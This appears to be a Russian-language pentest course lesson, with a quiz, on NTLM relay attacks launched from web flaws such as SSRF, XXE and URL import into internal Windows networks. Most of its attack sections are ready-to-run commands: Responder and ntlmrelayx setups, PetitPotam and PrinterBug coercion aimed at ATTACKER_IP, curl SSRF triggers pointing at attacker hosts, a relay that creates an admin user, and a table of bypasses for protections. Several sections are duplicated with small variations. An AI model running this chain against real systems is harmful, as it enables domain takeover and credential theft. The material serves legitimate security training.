---
id: web-ntlm-relay-web
title: "NTLM relay через web: Responder, WebDAV, внутренний pivot"
category: web
parent: web-host-header
difficulty: hard
order: 2
tags: [ntlm, relay, responder, webdav, ssrf, pivot]
prerequisites: [web-host-header, web-ssrf]
useful_for:
  - "Пентест внутренних сетей"
  - "Red team"
  - "Bug bounty (внутренние)"
estimated_minutes: 42
summary: "Как веб-уязвимость заставляет сервер аутентифицироваться по NTLM и релеит креды на другие хосты: Responder, WebDAV, coercion."
---

Когда веб-приложение обращается по URL, который вы контролируете, и это Windows-хост — он может **автоматически аутентифицироваться** по NTLM (если URL в Intranet-зоне или используется SMB/WebDAV). Перехваченный NTLM-хендшейк можно **релеить** (relay) на другой сервис (SMB, LDAP, HTTP, MSSQL), не ломая хеш. Это классический pivot из веб-уязвимости (SSRF/XXE/upload) во внутреннюю сеть Windows. Ключевые инструменты — **Responder**, **impacket ntlmrelayx**, coercion (PetitPotam/PrinterBug).

## Теория: почему сервер отдаёт NTLM

На Windows учётные данные привязаны к домену. При обращении к UNC-пути (`\\host\share`), SMB-URL или HTTP-ресурсу в Intranet-зоне клиент отправляет NTLM-хендшейк **без участия пользователя** (SSO). Если веб-приложение делает запрос на наш хост (SSRF, XXE, PDF-рендер, загрузка аватара по URL, WebDAV), Windows-сервер сам инициирует NTLM.

Ключевые условия для релея:
- **NTLM, не Kerberos** (релеить Kerberos нельзя).
- **SMB signing отключён** (для релея на SMB).
- **LDAP signing/channel binding отключён** (для релея на LDAP → создание пользователя/привилегии).
- **Целевой хост не требует EPA** (Extended Protection for Authentication) для HTTP.

## Инструменты

```bash
# 1. Responder слушает и отвечает на NTLM (без -w для релея)
responder -I eth0 -v

# 2. ntlmrelayx релеит на целевой хост
impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support
impacket-ntlmrelayx -t ldap://dc.corp.local -wh attacker --escalate-user lowuser

# 3. coercion (заставить машину аутентифицироваться к нам)
python3 PetitPotam.py -u u -p p ATTACKER_IP TARGET_IP
python3 printerbug.py corp/user:pass@TARGET ATTACKER_IP
```

Триггер из веба — SSRF/XXE на URL вида:
```
http://ATTACKER/  (HTTP NTLM)
\\ATTACKER\share  (SMB)
file://ATTACKER/... (в некоторых конфигурациях)
```

## Разобранный пример: SSRF → NTLM relay → SMB admin

Сетап: веб-приложение на Windows-сервере имеет SSRF; в сети есть файловый сервер без SMB signing; атакующий в той же сети (или через pivot).

Шаг 1. Запускаем Responder + ntlmrelayx:

```bash
responder -I eth0 -v
impacket-ntlmrelayx -t smb://10.0.0.50 -smb2support -socks
```

Шаг 2. Триггерим SSRF на наш хост:

```bash
curl -s "https://app.example/fetch?url=http://ATTACKER_IP/anything"
```

Шаг 3. Веб-сервер (под своей сервисной учёткой) шлёт NTLM. ntlmrelayx релеит на `10.0.0.50`, создаёт сессию. Если у сервисной учётки права админа на файловом сервере — получаем доступ, читаем shares.

```bash
# с -socks поднимается SOCKS-прокси для релеенных сессий
proxychains smbclient.py 'CORP/service$@10.0.0.50'
```

Шаг 4. Эскалация: если релеим на LDAP контроллера и учётка — машина/админ, можно создать пользователя, выдать DCSync-права.

## Coercion: заставить сервер аутентифицироваться

Если SSRF нет, но есть доступ к RPC (или через другую веб-уязвимость), заставляем Windows-хост инициировать NTLM к нам:

```bash
# PetitPotam (EfsRpcOpenFileRaw) -> машина шлёт NTLM
python3 PetitPotam.py ATTACKER_IP 10.0.0.20
# PrinterBug (MS-RPRN)
python3 printerbug.py corp/user:pass@10.0.0.20 ATTACKER_IP
```

Параллельно `ntlmrelayx` релеит к DC → создание machine account, RBCD, DCSync и т.д.

## WebDAV-специфика

Если веб-приложение — на Windows с WebClient (WebDAV), обращение к `\\attacker\` через HTTP заставляет хост аутентифицироваться. Часто триггерится через:
- SSRF на `http://ATTACKER/`;
- XXE (`SYSTEM "\\attacker\share"`);
- загрузку файла с URL (Windows подтянет UNC).

## Защиты и обходы

| Защита | Обход |
|--------|-------|
| SMB signing включён | Релеить на LDAP/HTTP/MSSQL |
| LDAP signing | Релеить на SMB (если signing off) |
| EPA/channel binding | Релеить на другой сервис |
| NTLM отключён | Искать Kerberos-пути (другой класс) |
| Ответчик не отвечает | Использовать coercion (PetitPotam) |

## Частые ошибки

- **Релеить, когда SMB signing включён.** Проверяйте (`nmap --script smb2-security-mode`).
- **Забыть `-smb2support`.** Многие хосты только SMB2.
- **Путать Responder для захвата и для релея.** Для релея — без `-w`, с `ntlmrelayx`.
- **Игнорировать LDAP-релей.** Часто даёт больше, чем SMB.
- **Не проверять EPA.** HTTP-релей часто блокируется EPA.
- **Триггерить продовую аутентификацию админа.** Аккуратно — можно сломать доступ.
- **Забыть про SOCKS.** `-socks` даёт устойчивый прокси.

## Куда релеить: цели и что даёт каждая

NTLM relay эффективен, когда у цели не требуется SMB signing и есть полезный протокол.

| Цель | Протокол | Результат |
|------|----------|-----------|
| SMB | 445 | выполнение команд (если admin) |
| LDAP/LDAPS | 389/636 | создание объектов, RBCD, смена пароля |
| ADCS (HTTP) | 80 | выдача сертификата (ESC8) |
| MSSQL | 1433 | выполнение SQL/команд |
| HTTP (Exchange) | 80 | доступ к почте (EWS) |
| IMAP/SMTP | 143/25 | почта |

```bash
# ntlmrelayx: релей на несколько целей сразу
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# релей на LDAP для RBCD
impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access
# релей на ADCS (ESC8)
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs
```

Проверяйте `signing`: `netexec smb <host>` — `signing:False` означает, что релей возможен.

## Coercion: заставить сервер аутентифицироваться

Чтобы релей сработал, нужно заставить цель отправить NTLM-аутентификацию на наш listener.

| Техника | Протокол | Инструмент |
|---------|----------|-----------|
| PetitPotam | MS-EFSRPC | `PetitPotam.py` |
| PrinterBug | MS-RPRN | `printerbug.py` |
| DFSCoerce | MS-DFSNM | `dfscoerce.py` |
| ShadowCoerce | MS-FSRVP | `shadowcoerce.py` |
| WebDAV (web) | HTTP | ссылка `\\attacker\share` |

```bash
# запускаем responder/ntlmrelayx в режиме прослушивания
impacket-ntlmrelayx -tf targets.txt -smb2support
# инициируем coerced-аутентификацию
python3 PetitPotam.py attacker_ip dc.corp.local
# цель аутентифицируется на нас -> релей на SMB/LDAP
```

## WebDAV-специфика (web-контекст)

В веб-сценарии часто используют WebDAV: заставляют сервер обратиться к UNC-пути `\\attacker\share`, что провоцирует NTLM-аутентификацию.

```bash
# 1) на attacker поднимаем WebDAV/responder
impacket-ntlmrelayx -t smb://dc.corp.local -smb2support -wh attacker.local
# 2) через веб-функцию (загрузка по URL, импорт) подсовываем UNC-путь
curl -s 'https://app.example/import?url=\\\\attacker.local\\share\\x'
# 3) сервер отдаёт NTLM-хэш -> релей
```

Точки входа: SSRF-функции, импорт по URL, «проверка ссылки», конвертеры документов.

## Защиты и обходы

| Защита | Обход |
|--------|-------|
| SMB signing | искать хосты без signing |
| LDAP signing | релей на LDAPS или ADCS-HTTP |
| Extended Protection (EPA) | искать сервисы без EPA |
| SMB1 отключён | релей на HTTP/LDAP |
| NTLM отключён | релей невозможен (тупик) |

```bash
# ищем цели без signing
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

## Разобранный пример: SSRF → NTLM relay → SMB admin

```text
1) приложение делает HTTP-запрос по URL из параметра (SSRF)
2) подсовываем URL вида \\attacker\share\file (или http://attacker/)
3) сервер аутентифицируется NTLM на наш ntlmrelayx
4) релеим на SMB файлового сервера без signing
5) получаем доступ уровня admin (или создаём пользователя через LDAP-релей)
```

```bash
# шаг 4-5
impacket-ntlmrelayx -t smb://fileserver.corp.local -smb2support \
  -c 'whoami; net user hacker Passw0rd! /add'
```

## Что делать дальше / решение

1. **Найдите SSRF/UNC-точку.** Импорт по URL, «проверка ссылки».
2. **Проверьте signing.** Какие хосты можно релеить.
3. **Поднимите ntlmrelayx.** Цели и режим (SMB/LDAP/ADCS).
4. **Инициируйте аутентификацию.** Coercion или UNC-путь.
5. **Получите результат.** Команды/объекты/сертификат.
6. **Зафиксируйте PoC.** Релей + действие на цели.

## Практика и справочники

- **HackTricks** — «NTLM relay», «Coercing».
- **Impacket** — `ntlmrelayx.py`, coercion-скрипты.
- **Responder** — перехват аутентификации.
- **playbook-ad** — раздел relay/ADCS.

## Практические приоритеты в NTLM relay

Первым делом проверьте, где вообще возможен релей: соберите список хостов без SMB signing (`netexec smb --gen-relay-list`). Затем найдите точку, через которую можно инициировать NTLM-аутентификацию цели — SSRF/UNC-импорт в веб-приложении или coercion-техника. И только потом выбирайте протокол-цель: SMB (команды), LDAP (объекты/RBCD), ADCS-HTTP (сертификаты). Помните, что релей без цели бесполезен, а цель без signing — редкость в зрелых доменах, поэтому приоритет — поиск именно слабо защищённых сервисов.

## Итог

NTLM relay в веб-контексте обычно начинается с SSRF или «импорта по URL», который заставляет сервер аутентифицироваться на контролируемом хосте. Дальше всё зависит от целей: `signing:False`, отсутствие EPA, доступный ADCS-HTTP. Проверяйте оба конца цепочки — точку coercion и незащищённую цель — и фиксируйте PoC конкретным действием на цели (команда, созданный объект, выданный сертификат).

## Частые ошибки при NTLM relay

- Пытаться релеить на хост с включённым SMB signing — не сработает.
- Забывать про EPA/LDAP signing — выбирать неправильную цель.
- Не иметь цели вообще: релей без конечной точки бесполезен.
- Считать любой SSRF подходящим: нужен именно UNC/HTTP-путь, вызывающий NTLM.
- Игнорировать ADCS: HTTP-эндпоинт `certsrv` — часто самая ценная цель.

## Дополнительно: приоритет целей

Если в домене есть ADCS с HTTP-эндпоинтом и без EPA — это приоритет №1: релей даёт сертификат, а сертификат — аутентификацию от имени машины/пользователя. Далее — LDAP для RBCD (создание объекта и делегирование), затем — SMB для прямого выполнения команд.

## Кратко

NTLM relay в вебе начинается с SSRF или импорта по URL, который заставляет сервер аутентифицироваться на контролируемом хосте. Дальше всё решают цели: хосты без SMB signing, LDAP без защиты, ADCS-HTTP без EPA. Проверяйте оба конца цепочки и фиксируйте PoC действием на цели.

## Квиз

```quiz
- question: "Почему веб-сервер отдаёт NTLM при SSRF на UNC-путь?"
  options:
    - "Он так настроен"
    - "Windows автоматически аутентифицируется по NTLM для ресурсов в Intranet-зоне"
    - "Из-за TLS"
    - "Из-за cookie"
  answer: 1
  explanation: "SSO-поведение Windows."
- question: "Что нужно для релея на SMB?"
  options:
    - "SMB signing выключен"
    - "SMB signing включён"
    - "Kerberos"
    - "EPA"
  answer: 0
  explanation: "Иначе хендшейк не привязать к чужой сессии."
- question: "Какой инструмент слушает и релеит NTLM?"
  options:
    - "sqlmap"
    - "Responder + impacket-ntlmrelayx"
    - "nmap"
    - "ffuf"
  answer: 1
  explanation: "Responder ловит, ntlmrelayx релеит."
- question: "Что такое coercion?"
  options:
    - "Перебор пароля"
    - "Принуждение хоста инициировать NTLM-аутентификацию (PetitPotam/PrinterBug)"
    - "Шифрование"
    - "Смена DNS"
  answer: 1
  explanation: "Заставляет машину аутентифицироваться к нам."
- question: "Куда релеить, если SMB signing включён?"
  options:
    - "Никуда"
    - "На LDAP/HTTP/MSSQL, где нет подписи/EPA"
    - "На DNS"
    - "На SMTP"
  answer: 1
  explanation: "Ищем сервис без обязательной подписи."
```

## Где пригодится

- **CTF:** задачи на Windows-pivot из веба.
- **Bug bounty (внутренние):** релей через SSRF/XXE — высокий импакт.
- **Пентест/Red team:** классический путь к домену.
- **Работа (AppSec/Blue):** включение SMB/LDAP signing, EPA, отключение NTLM, блокировка coercion-портов.
